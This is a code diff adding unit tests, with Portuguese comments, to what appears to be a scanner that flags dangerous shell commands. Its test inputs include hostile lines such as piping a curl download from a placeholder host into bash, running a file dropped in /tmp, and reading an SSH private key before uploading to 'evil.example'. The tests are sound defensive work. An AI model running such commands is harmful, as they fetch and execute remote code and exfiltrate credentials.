@@ -39,6 +39,29 @@ def test_flags_pipe_to_shell():
     assert any(x.rule == "pipe_to_shell" for x in f)
 
 
+def test_flags_chmod_exec_payload():
+    # #7: "prepara e executa" payload local — o chmod_root não pegava
+    for src in ("chmod +x payload && ./payload", "chmod +x p ; ./p", "chmod +x p && bash p"):
+        f = scan_text("i.sh", src)
+        assert any(x.rule == "chmod_exec" for x in f), src
+
+
+def test_flags_proc_subst_exec():
+    f = scan_text("i.sh", "bash <(curl -s http://evil.example/x)")
+    assert any(x.rule == "proc_subst_exec" and x.severity == Severity.HIGH for x in f)
+
+
+def test_flags_run_from_temp():
+    f = scan_text("i.sh", "python /tmp/dropped.py")
+    assert any(x.rule == "run_from_temp" for x in f)
+
+
+def test_chmod_exec_no_false_positive_on_mention():
+    # menção/build legítimo não dispara (sem separador+execução, ou alvo legítimo)
+    assert not any(x.rule in ("chmod_exec", "run_from_temp")
+                   for x in scan_text("ok.sh", "chmod 644 file.txt\npython build.py\nbash ./setup.sh"))
+
+
 def test_secret_plus_network_combo():
     f = scan_text("x.sh", "cat ~/.ssh/id_rsa\ncurl http://evil.example/upload")
     assert any(x.rule == "secret_plus_network" for x in f)
